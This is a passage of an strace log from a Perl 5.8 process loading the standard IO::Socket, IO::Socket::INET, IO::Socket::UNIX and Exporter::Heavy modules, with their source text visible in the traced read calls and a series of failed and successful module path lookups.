$r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
8463  07:23:33.143618 _llseek(8, 5966, [5966], SEEK_SET) = 0
8463  07:23:33.143634 _llseek(8, 0, [5966], SEEK_CUR) = 0
8463  07:23:33.143644 close(8)          = 0
8463  07:23:33.144069 brk(0x827b000)    = 0x827b000
8463  07:23:33.144195 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
8463  07:23:33.144687 _llseek(6, 6698, [6698], SEEK_SET) = 0
8463  07:23:33.144703 _llseek(6, 0, [6698], SEEK_CUR) = 0
8463  07:23:33.144724 close(6)          = 0
8463  07:23:33.144770 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144799 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144813 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144826 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144840 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144853 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144867 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144879 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144893 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144905 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144918 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.144931 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
8463  07:23:33.144953 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.144968 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.144979 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.144996 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
8463  07:23:33.145364 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145380 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145393 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145406 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145420 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145433 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145447 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145459 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145472 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145484 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145502 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145515 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145528 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.145541 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
8463  07:23:33.145562 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.145577 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.145588 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.145605 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
8463  07:23:33.146414 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
8463  07:23:33.146612 brk(0x829c000)    = 0x829c000
8463  07:23:33.146931 read(8, "", 4096) = 0
8463  07:23:33.146948 close(8)          = 0
8463  07:23:33.148485 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
8463  07:23:33.163164 _llseek(6, 6496, [6496], SEEK_SET) = 0
8463  07:23:33.163182 _llseek(6, 0, [6496], SEEK_CUR) = 0
8463  07:23:33.163192 close(6)          = 0
8463  07:23:33.163314 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163333 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163348 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163361 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163389 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163402 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163417 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163429 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163443 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163455 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163468 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.163482 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
8463  07:23:33.163504 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.163519 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.163531 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.163551 brk(0x82bd000)    = 0x82bd000
8463  07:23:33.163569 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
8463  07:23:33.164641 _llseek(6, 1386, [1386], SEEK_SET) = 0
8463  07:23:33.164659 _llseek(6, 0, [1386], SEEK_CUR) = 0
8463  07:23:33.164669 close(6)          = 0
8463  07:23:33.164776 stat64("/etc/perl/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164809 stat64("/etc/perl/IO/Dir.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164824 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164868 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164882 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164895 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164908 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164920 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164933 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164945 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
